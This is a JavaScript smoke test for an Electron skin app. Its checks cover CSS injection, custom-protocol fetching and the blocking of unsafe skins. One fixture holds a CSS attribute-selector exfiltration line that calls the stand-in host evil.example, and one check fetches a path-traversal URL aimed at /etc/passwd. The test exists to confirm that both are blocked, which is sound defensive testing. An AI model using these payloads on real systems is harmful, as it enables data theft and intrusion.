"use strict";
/**
 * 端到端冒烟测试：用真的 Electron 把真的启动路径跑一遍。
 *
 * 为什么不用单元测试代替：这个程序里最容易坏的三件事，单元测试一件都碰不到 ——
 * 自定义协议注册的时机（晚一步就全部素材 404，且不报错）、皮肤 CSS 有没有真的
 * 进到预览 iframe 里（同源判断错了就静默失败）、以及"带 error 的皮肤不给套用"
 * 这条拦截是不是真的在拦。这三件都必须有一个渲染进程在跑才能验。
 *
 *     npx electron app/test/smoke.js
 *
 * 全程不碰用户真实的 ~/.dsh-skin —— 开头把 DSH_SKIN_HOME 指到一个临时目录。
 */
const fs = require("node:fs");
const os = require("node:os");
const path = require("node:path");

const SANDBOX = fs.mkdtempSync(path.join(os.tmpdir(), "dsh-skin-smoke-"));
process.env.DSH_SKIN_HOME = SANDBOX;
process.env.DSH_SKIN_HEADLESS = "1";

// 一套两张背景的皮肤，用来验证「换下一张背景」在**关闭轮播时**也管用。
const multi = path.join(SANDBOX, "skins", "multi-backdrop");
fs.mkdirSync(path.join(multi, "assets"), { recursive: true });
for (const name of ["a.svg", "b.svg"]) {
  fs.writeFileSync(path.join(multi, "assets", name),
    '<svg xmlns="http://www.w3.org/2000/svg" width="2" height="2"/>');
}
fs.writeFileSync(path.join(multi, "skin.json"), JSON.stringify({
  name: "两张背景", backdrops: ["assets/a.svg", "assets/b.svg"] }));
fs.writeFileSync(path.join(multi, "skin.css"),
  ':root{--color-bg:#000;--color-text:#fff;--color-accent:#0af;}\n#app{background-image:var(--dsh-backdrop);}\n');

// 素材名里带 # 和空格 —— encodeURI 不转义 #，从 # 起会被当成 URL 片段。
const odd = path.join(SANDBOX, "skins", "odd-names");
fs.mkdirSync(path.join(odd, "assets"), { recursive: true });
fs.writeFileSync(path.join(odd, "assets", "a #1 b.svg"),
  '<svg xmlns="http://www.w3.org/2000/svg" width="2" height="2"/>');
fs.writeFileSync(path.join(odd, "skin.json"), JSON.stringify({ name: "怪文件名" }));
fs.writeFileSync(path.join(odd, "skin.css"),
  ':root{--color-bg:#000;--color-text:#fff;--color-accent:#0af;}\n#app{background-image:url("__SKIN__/a #1 b.svg");}\n');

// 放一套故意带远程 URL 的皮肤，用来验证"拦截"这条是真的。
const evil = path.join(SANDBOX, "skins", "evil-remote");
fs.mkdirSync(evil, { recursive: true });
fs.writeFileSync(path.join(evil, "skin.json"), JSON.stringify({ name: "外泄测试用" }));
fs.writeFileSync(path.join(evil, "skin.css"),
  ':root{--color-bg:#000;--color-text:#fff;--color-accent:#f0f;}\ninput[value^="a"]{background:url(https://evil.example/?a);}\n');

require("../src/main/index.js");

const { app, BrowserWindow, net } = require("electron");
const skins = require("../src/main/skins");
const shellMode = require("../src/main/shell");

const checks = [];
const check = (name, pass, detail = "") => {
  checks.push({ name, pass: Boolean(pass), detail });
  console.log(`${pass ? "  ok  " : "  FAIL"} ${name}${detail ? `  — ${detail}` : ""}`);
};

const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

/** 渲染进程是异步填充的，轮询到条件成立或超时。 */
async function until(wc, expression, timeoutMs = 8000) {
  const deadline = Date.now() + timeoutMs;
  let last = null;
  while (Date.now() < deadline) {
    try { last = await wc.executeJavaScript(expression); if (last) return last; }
    catch { /* 页面还没准备好 */ }
    await sleep(150);
  }
  return last;
}

app.whenReady().then(async () => {
  try {
    await sleep(400);
    const win = BrowserWindow.getAllWindows()[0];
    check("工作室窗口创建了", Boolean(win));
    if (!win) throw new Error("没有窗口");
    const wc = win.webContents;
    if (wc.isLoading()) await new Promise((r) => wc.once("did-finish-load", r));
    check("加载的是自定义协议地址", wc.getURL().startsWith("dshskin://app/"), wc.getURL());

    /* 1. 皮肤库扫出来了，内置 6 套 + 沙盒里那套坏的 */
    const count = await until(wc, "document.querySelectorAll('.skin').length");
    check("皮肤列表渲染出来了", count >= 7, `${count} 套（6 内置 + 1 测试用）`);

    /* 2. 皮肤 CSS 真的进了预览 iframe，且算出来的值变了 */
    const injected = await until(wc, `(() => {
      const d = document.getElementById('frame').contentDocument;
      const s = d && d.getElementById('dsh-skin-preview');
      if (!s || !s.textContent.trim()) return null;
      const cs = getComputedStyle(d.documentElement);
      return { bytes: s.textContent.length,
               accent: cs.getPropertyValue('--color-accent').trim(),
               mountBg: getComputedStyle(d.getElementById('app')).backgroundImage.slice(0, 40) };
    })()`);
    check("皮肤 CSS 注入进了预览沙盒", injected && injected.bytes > 500, injected ? `${injected.bytes} 字节` : "没注入");
    check("沙盒里算出来的强调色被皮肤改掉了", Boolean(injected && injected.accent), injected?.accent || "空");
    check("挂载点铺上了背景", Boolean(injected && injected.mountBg && injected.mountBg !== "none"), injected?.mountBg || "");

    /* 3. 自定义协议真的能取到皮肤文件 */
    const good = await net.fetch("dshskin://skin/midnight-harbor/skin.css");
    check("dshskin:// 能取到皮肤素材", good.status === 200, `HTTP ${good.status}`);
    const escape = await net.fetch("dshskin://skin/midnight-harbor/../../../../etc/passwd");
    check("路径穿越被挡住", escape.status !== 200, `HTTP ${escape.status}`);
    const ghost = await net.fetch("dshskin://skin/no-such-skin/skin.css");
    check("不存在的皮肤返回 404", ghost.status === 404, `HTTP ${ghost.status}`);

    /* 4. 带远程 URL 的皮肤拿不到可套用的 CSS —— 拦截是真的 */
    const blocked = skins.compile("evil-remote");
    check("带远程 URL 的皮肤被拒绝套用", blocked.css === null,
      blocked.report ? `${blocked.report.errors} 个 error` : "没跑到检查");
    const clean = skins.compile("midnight-harbor");
    check("干净皮肤能编译出可套用的 CSS", typeof clean.css === "string" && clean.css.length > 500,
      `${clean.css ? clean.css.length : 0} 字节`);
    check("__SKIN__ 占位符已被替换", clean.css && !clean.css.includes("__SKIN__"));

    /* 5. 外壳模式：真的起一个本地页面，真的开一个外壳窗口，读回注入结果。
          这条是整个程序的卖点，不能只靠"代码看起来对"。 */
    const http = require("node:http");
    const server = http.createServer((_req, res) => {
      res.writeHead(200, { "Content-Type": "text/html; charset=utf-8" });
      res.end('<!doctype html><meta charset="utf-8"><title>host</title><div id="app">假宿主</div>');
    });
    await new Promise((r) => server.listen(0, "127.0.0.1", r));
    const origin = `http://127.0.0.1:${server.address().port}/`;

    const shellWin = shellMode.open(origin, "midnight-harbor", () => {});
    await new Promise((r) => shellWin.webContents.once("did-finish-load", r));
    const applied = await shellMode.apply(shellWin, "midnight-harbor");
    check("外壳窗口注入成功", applied.ok, applied.error || "");
    check("外壳里的强调色是皮肤给的", Boolean(applied.probe && applied.probe.accent),
      applied.probe ? `${applied.probe.accent} @ #${applied.probe.mount}` : "读不回来");
    check("外壳挂载点铺上了背景", Boolean(applied.probe && applied.probe.layers > 0),
      applied.probe ? `${applied.probe.layers} 层` : "");

    const refused = await shellMode.apply(shellWin, "evil-remote");
    check("带远程 URL 的皮肤注入不进外壳", refused.ok === false, refused.error || "");
    const afterRefusal = await shellWin.webContents.executeJavaScript(
      `getComputedStyle(document.documentElement).getPropertyValue("--color-accent").trim()`);
    check("被拒绝后上一套皮肤也被撤干净", afterRefusal === "", `残留 "${afterRefusal}"`);

    shellWin.destroy();
    server.close();

    /* 6. 回归：关闭轮播时「换下一张背景」也要真的换。
          原来 currentBackdrop 在 rotate=false 时硬返回第一张，而按钮只要
          背景多于一张就显示 —— 点了没反应，且没有任何报错。 */
    const state = require("../src/main/state");
    state.patch({ skin: "multi-backdrop", rotate: false, cycle: [], cursor: 0 });
    skins.invalidate();
    const multiSkin = skins.find("multi-backdrop");
    const first = skins.currentBackdrop(multiSkin);
    const advanced = skins.advance("multi-backdrop", true);
    const second = skins.currentBackdrop(multiSkin);
    check("关闭轮播时也能手动换下一张背景", advanced && first !== second, `${first} -> ${second}`);

    /* 7. 回归：素材名里的 # 不能把路径截断。 */
    const hashed = await net.fetch(`dshskin://skin/odd-names/${encodeURIComponent("a #1 b.svg")}`);
    check("素材名里带 # 和空格也取得到", hashed.status === 200, `HTTP ${hashed.status}`);

    /* 8. 崩溃循环断路器：连续两次没走到界面就自动进安全模式。 */
    const recovery = require("../src/main/recovery");
    const { home } = require("@dsh-skin/core");
    home.setSafeMode(false, undefined);
    fs.writeFileSync(home.paths().bootLock, JSON.stringify({ at: "x", fails: 1 }));
    const trip = recovery.beginBoot();
    check("连续启动失败会自动进安全模式", trip.safeMode && trip.tripped, `fails=${trip.fails}`);
    recovery.bootSucceeded();
    check("界面出来之后断路器标记被清掉", !fs.existsSync(home.paths().bootLock));
    home.setSafeMode(false, undefined);

    /* 9. 还原点是自动存的 —— 用户不需要记得，agent 也不需要。 */
    const before = require("@dsh-skin/core").history.list().length;
    await new Promise((r) => setTimeout(r, 1100));   // 还原点 id 带时间戳，同秒会撞名
    recovery.checkpoint("smoke", "冒烟测试存的");
    check("改动前会自动存还原点", require("@dsh-skin/core").history.list().length === before + 1);
  } catch (error) {
    check("测试跑完", false, error.message);
  }

  const failed = checks.filter((c) => !c.pass);
  console.log(`\n${checks.length - failed.length}/${checks.length} 通过`);
  fs.rmSync(SANDBOX, { recursive: true, force: true });
  app.exit(failed.length ? 1 : 0);
});
